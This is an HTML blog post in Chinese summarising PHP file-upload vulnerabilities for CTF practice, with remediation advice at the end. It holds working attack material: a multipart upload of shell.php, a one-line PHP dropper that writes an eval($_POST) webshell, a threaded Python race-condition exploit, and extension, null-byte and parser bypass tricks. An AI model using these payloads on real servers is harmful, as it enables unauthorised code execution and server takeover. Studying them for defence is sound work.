@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      PHP文件上传漏洞总结 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>PHP文件上传漏洞总结</h2>
+  <p class="post-date">2019-07-10 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比赛时候基本每一场都会遇到文件上传的题目，但是解题思路一直受限于文件上传漏洞的不清晰。遂整理，虽然里面很多绕过CTF不怎么会考了(可能太简单了，或许我太菜)。</p>
+<h1 id="文件上传包结构"><a href="#文件上传包结构" class="headerlink" title="文件上传包结构"></a>文件上传包结构</h1><ol>
+<li>请求类型:POST</li>
+<li>前端指定类型enctype</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&#39;&#39; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; method&#x3D;&#39;POST&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;&#39;file&#39; name&#x3D;&#39;file&#39;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>multipart 格式的数据会将一个表单拆分为多个部分（part），每个部分对应一个输入域。在一般的表单输入域中，<br>它所对应的部分中会放置文本型数据，但是如果上传文件的话，它所对应的部分可以是二进制</p>
+<p><strong>curl、python都有API可以上传文件不用特意构造文件上传包</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Filename&quot;</span><br><span class="line"></span><br><span class="line">shell.php</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;desc11&quot;</span><br><span class="line"></span><br><span class="line">desc112</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;task&quot;</span><br><span class="line"></span><br><span class="line">doupload</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_id&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;shell.php::$DATA&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Submit Query</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2--</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="文件上传存在的检测"><a href="#文件上传存在的检测" class="headerlink" title="文件上传存在的检测"></a>文件上传存在的检测</h1><blockquote>
+<ol>
+<li>客户端javascript检测(检测文件扩展名)</li>
+<li>服务端MIME类型检测(检测Content-Type内容)</li>
+<li>服务器端目录路径检测(检测和Path参数相关的内容)</li>
+<li>服务端文件扩展名检测(检测跟文件extension相关的内容)</li>
+<li>服务端文件内容检测(检测内容是否合法或含有恶意代码)</li>
+</ol>
+</blockquote>
+<h1 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPic</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> rgx= <span class="string">"(.jpg|.JPG|.gif|.GIF)$"</span>; </span><br><span class="line">	<span class="keyword">var</span> re=<span class="keyword">new</span> <span class="built_in">RegExp</span>(rgx);</span><br><span class="line">	<span class="keyword">var</span> file_name=$(<span class="string">"#picFile"</span>).val();</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul>
+<li>审查元素，修改Javascript检测函数</li>
+<li>burpsuite抓包改后缀</li>
+</ul>
+<h1 id="服务端MIME类型检测"><a href="#服务端MIME类型检测" class="headerlink" title="服务端MIME类型检测"></a>服务端MIME类型检测</h1><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>burpsuite代理进行抓包,修改<code>Content-Type</code>为<code>image/gif</code>….</p>
+<h1 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h1><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>存在path参数可控，配合<strong>解析漏洞</strong>上传webshell<br>php 00截断: <code>GET:/upload/1.php%001.jpg</code><br>            <code>POST:在文件名后burpsuite添加二进制00</code></p>
+<p><a href="https://note.youdao.com/ynoteshare1/index.html?id=36658a534d9b3966bdef19cc3c5cb576&type=note" target="_blank" rel="noopener">00截断技巧</a></p>
+<h2 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include(require)</span><br><span class="line">file_get_contents</span><br><span class="line">file_exists</span><br><span class="line">所有url中参数可以用%00控制</span><br></pre></td></tr></table></figure>
+
+<h1 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h1><h2 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>利用思路:<strong>os系统特性、后缀名截取不规范、php代码缺陷、过滤不完全、配合伪协议解析图形文件</strong></p>
+<h3 id="后端采用in-arrary函数判断文件后缀-黑名单"><a href="#后端采用in-arrary函数判断文件后缀-黑名单" class="headerlink" title="后端采用in_arrary函数判断文件后缀(黑名单)"></a>后端采用in_arrary函数判断文件后缀(黑名单)</h3><ul>
+<li>更换.htaccess偏门文件名和后缀名</li>
+<li>未去除末尾空格，添加空格绕过</li>
+<li>::$DATA绕过（windows）</li>
+<li>大小写混写</li>
+<li>后缀添加点号(windows)</li>
+<li>不可绕过考虑phar://协议利用，若过滤配合(compress://)</li>
+<li>/.符号绕过</li>
+</ul>
+<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>webserver解析漏洞、00解析漏洞</p>
+<h1 id="服务器端文件内容检测"><a href="#服务器端文件内容检测" class="headerlink" title="服务器端文件内容检测"></a>服务器端文件内容检测</h1><h2 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="文件幻数检测"></a>文件幻数检测</h2><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>GIF ： 47 49 46 38 39 61 (GIF89a)<br>PNG： 89 50 4E 47</p>
+<h3 id="绕过方法-伪造幻数，添加webshell"><a href="#绕过方法-伪造幻数，添加webshell" class="headerlink" title="绕过方法:伪造幻数，添加webshell"></a>绕过方法:伪造幻数，添加webshell</h3><h2 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h2><p>伪造好幻数后，添加webshell,添加额外内容，增大文件大小</p>
+<h2 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h2><p>调用API或者函数进行文件加载检测，常见是图像渲染检测，进行二次渲染</p>
+<h3 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>参考链接：<a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a><br><a href="https://od0d.cn/2019/04/17/DDCTF-web题解/#image-upload" target="_blank" rel="noopener">https://od0d.cn/2019/04/17/DDCTF-web题解/#image-upload</a></p>
+<h1 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h1><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./"</span>;</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+
+<h1 id="解析漏洞总结"><a href="#解析漏洞总结" class="headerlink" title="解析漏洞总结"></a>解析漏洞总结</h1><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache 1.x &amp; 2.x：当Apache遇到不认识的后缀名时，如：1.php.xx，会从后往前依次尝试解析，直到发现认识的php后缀名，遂当做PHP脚本解析。(apache认识的后缀名储存在/etc/mime.types)</p>
+<h2 id="新版本apache解析漏洞"><a href="#新版本apache解析漏洞" class="headerlink" title="新版本apache解析漏洞"></a>新版本apache解析漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>文件名后缀burpsuite hex添加<code>\x0A</code>,访问<code>/1.php%0A</code>成功解析。因为$匹配<code>&#39;\n&#39;</code>或<code>&#39;\r&#39;</code></p>
+<h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>当文件名为<code>*.asp;1.jpg</code>类型的格式时，会被IIS当做ASP脚本执行</p>
+<h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>a. test.jpg=&gt;test.jpg/x.php进行解析攻击。<br>b. 低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
+<h1 id="文件上传其他知识点"><a href="#文件上传其他知识点" class="headerlink" title="文件上传其他知识点"></a>文件上传其他知识点</h1><ol>
+<li>php自包含:<a href="https://www.anquanke.com/post/id/153376" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153376</a><br>阻止move_uploaded_file(file,newloc)删除临时文件<br>利用条件：文件夹可读、可控文件包含点、目录遍历漏洞查看临时文件名</li>
+<li>反序列化上传<br><a href="https://od0d.cn/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/" target="_blank" rel="noopener">https://od0d.cn/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/</a></li>
+<li>unlink竞争</li>
+<li>end函数缺陷</li>
+</ol>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ul>
+<li>白名单机制</li>
+<li>文件名随机重命名，修改为特定后缀名</li>
+<li>检查文件内容</li>
+<li>隐藏文件路径</li>
+<li>保存文件在web目录之外，不能直接访问，防止解析</li>
+<li>将文件保存到第三方</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/164561#h2-1" target="_blank" rel="noopener">对文件上传的一些思考和总结</a></p>
+<p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">文件上传总结</a></p>
+<p><a href="https://ultramangaia.github.io/blog/2018/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">解析漏洞与文件上传漏洞</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#文件上传" >
+    <span class="tag-code">文件上传</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/">
+        <span class="nav-arrow">← </span>
+        
+          phpdisk前台Getshell(复现)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/07/12/DiscuzML-3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">
+        
+          DiscuzML 3.x 代码注入
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
